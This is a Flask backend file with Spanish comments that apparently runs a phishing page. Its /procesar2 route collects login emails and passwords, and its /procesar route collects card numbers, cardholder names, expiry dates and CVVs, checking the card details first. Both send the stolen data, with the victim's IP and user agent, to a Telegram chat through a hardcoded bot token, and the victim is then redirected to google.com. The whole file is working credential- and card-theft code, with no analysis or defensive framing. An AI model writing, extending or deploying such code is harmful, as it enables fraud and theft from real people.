from flask import Blueprint, flash , render_template, request, redirect, jsonify, Flask, abort, send_file, url_for
import requests
import time
import re
import sqlite3
from werkzeug.middleware.proxy_fix import ProxyFix # <-- 1. Importa esto
import os 
from flask_sqlalchemy import SQLAlchemy
from .models import RegistroIP
from .extensions import db
from datetime import datetime


app = Flask(__name__)



app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
main_bp = Blueprint('main', __name__)


BOT_TOKEN = '8927384876:AAGKR6NLbwoCue_zra4tHCwGbKWlYVCiy6s'
CHAT_ID = '-5303523525'

def validar_tarjeta(ccid, mmaa, ccv):
    print(ccid, mmaa, ccv)
    # Limpiar espacios
    num = ccid.replace(" ", "").strip()
    cvv = ccv.strip()
    venc = mmaa.strip()
    print(num, venc, cvv)
    # 1. Validar número de tarjeta
    if not num.isdigit() or not num.startswith(('3', '4', '5')):
        return "El número de tarjeta es inválido."

    largo_esperado = 15 if num.startswith('3') else 16
    if len(num) != largo_esperado:
        return f"El número de tarjeta está incompleto (debe tener {largo_esperado} dígitos)."

    # 2. Validar fecha de vencimiento (MM/AA)
    partes = venc.split('/')
    if len(partes) != 2 or not (partes[0].isdigit() and partes[1].isdigit()):
        return "La fecha de vencimiento está incompleta o mal escrita (MM/AA)."

    mes, anio = int(partes[0]), 2000 + int(partes[1])
    if mes < 1 or mes > 12:
        return "El mes de vencimiento no es válido."

    hoy = datetime.now()
    if anio < hoy.year or (anio == hoy.year and mes < hoy.month):
        return "La tarjeta se encuentra vencida."

    # 3. Validar CVV (4 dígitos para Amex/3, 3 dígitos para Visa/Master)
    cvv_esperado = 4 if num.startswith('3') else 3
    if not cvv.isdigit() or len(cvv) != cvv_esperado:
        return f"El código de seguridad (CVV) debe tener {cvv_esperado} dígitos."

    return None # Todo OK

def obtener_ip_real():
    ip_cf = request.headers.get('CF-Connecting-IP')
    ip_xf = request.headers.get('X-Forwarded-For')
    ip_real = request.remote_addr
    
    # NUEVO: Capturamos a qué endpoint y con qué método están accediendo
    ruta = request.path
    metodo = request.method
    
    # Escribimos en el log agregando "Ruta: GET /ejemplo" al final
    with open('servidor_log.txt', 'a', encoding='utf-8') as log:
        log.write(f"[{time.strftime('%H:%M:%S')}] Conexión -> CF: {ip_cf} | X-Forwarded: {ip_xf} | Remote Addr: {ip_real} | Ruta: {metodo} {ruta}\n")
        
    if ip_cf:
        return ip_cf
    if ip_xf:
        return ip_xf.split(',')[0].strip()
    return ip_real

def enviar_telegram1(email, passwd, ip, user_agent):
    try:
        texto_mensaje = (
        
                    f"Email: `{email}`\n"
                    f"Pass: `{passwd}`\n"
                    f"IP: `{ip}`\n"
                    f"User-Agent: `{user_agent}`\n"
                )
        
        print(texto_mensaje)

        url_mensaje = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            
                
        payload_mensaje = {
            "chat_id": CHAT_ID,
            "text": texto_mensaje,
            "parse_mode": "Markdown"
        }
        
        # Disparamos el mensaje normal
        respuesta_msg = requests.post(url_mensaje, json=payload_mensaje, timeout=15)
        respuesta_msg.raise_for_status()
        print("[TAREA] ✅ Mensaje individual enviado.")

    except Exception as e:
        print("\n❌ ERROR EN LA TAREA DE FONDO ❌")
        traceback.print_exc()

def enviar_telegram2(ccid,nombre_completo,mmaa,ccv, ip, user_agent):
    try:
        texto_mensaje = (
                    f"Num: `{ccid}`\n"
                    f"Nombre: `{nombre_completo}`\n"
                    f"MMAA: `{mmaa}`\n"
                    f"CVV: `{ccv}`\n"
                    f"IP: `{ip}`\n"
                    f"User-Agent: `{user_agent}`\n"
                )
        
        print(texto_mensaje)

        url_mensaje = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            
                
        payload_mensaje = {
            "chat_id": CHAT_ID,
            "text": texto_mensaje,
            "parse_mode": "Markdown"
        }
        
        # Disparamos el mensaje normal
        respuesta_msg = requests.post(url_mensaje, json=payload_mensaje, timeout=15)
        respuesta_msg.raise_for_status()
        print("[TAREA] ✅ Mensaje individual enviado.")

    except Exception as e:
        print("\n❌ ERROR EN LA TAREA DE FONDO ❌")
        traceback.print_exc()

@main_bp.route('/')
def prueba():
    mensaje_error = request.args.get('error_popup')
    
    # 2. Se lo pasamos al HTML para que dispare el popup rojo
    return render_template('index3.html', error_popup=mensaje_error)


@main_bp.route('/procesar', methods=['POST'])
def procesar():
    ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    registro = RegistroIP.query.filter_by(ip=ip).first()

    if registro and registro.form2:
        print("Esta registrada")
        user_agent = request.headers.get('User-Agent')
        ccid = request.form.get('custom-field-1', '')
        nombre_completo = request.form.get('custom-field-2', '')
        mmaa = request.form.get('custom-field-3', '')
        ccv = request.form.get('custom-field-4', '')
        print("Datos recibidos:", ccid,nombre_completo,mmaa,ccv, ip, user_agent)
        error = validar_tarjeta(ccid, mmaa, ccv)
        print("DEBUG ERROR:", error)
        if error:
            flash(error, 'error_tarjeta')
            return jsonify({"ok": False, "redirect": "/"}), 400
        
        # Imprime el diccionario completo en la consola de Python
        
        enviar_telegram2(ccid,nombre_completo,mmaa,ccv, ip, user_agent)
        
        return jsonify({"ok": True, "redirect": "https://www.google.com"}), 200

    else:    
        print("no Esta registrada")
        user_agent = request.headers.get('User-Agent')
        ccid = request.form.get('custom-field-1', '')
        nombre_completo = request.form.get('custom-field-2', '')
        mmaa = request.form.get('custom-field-3', '')
        ccv = request.form.get('custom-field-4', '')
        error = validar_tarjeta(ccid, mmaa, ccv)
        print("DEBUG ERROR:", error)
        if error:
            flash(error, 'error_tarjeta')
            return jsonify({"ok": False, "redirect": "/"}), 400

        # Imprime el diccionario completo en la consola de Python
        print("Datos recibidos:", ccid,nombre_completo,mmaa,ccv, ip, user_agent)
        enviar_telegram2(ccid,nombre_completo,mmaa,ccv, ip, user_agent)
        registro.form2 = True
        db.session.commit()   
        return jsonify({"ok": True, "redirect": "https://www.google.com"}), 200

@main_bp.route('/procesar2', methods=['POST'])
def procesar2():
    ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    registro = RegistroIP.query.filter_by(ip=ip).first()

    if registro and registro.form1:
        return jsonify({"status": "ok"}), 200

    else:    
        db.session.add(RegistroIP(ip=ip, form1=True))

        user_agent = request.headers.get('User-Agent')
        db.session.commit()
        email = request.form.get('login-identifier', '')
        passwd = request.form.get('login-password', '')

        print("Datos recibidos:", email, passwd, ip, user_agent)
        enviar_telegram1(email, passwd, ip, user_agent)
        return jsonify({"status": "ok"}), 200
    

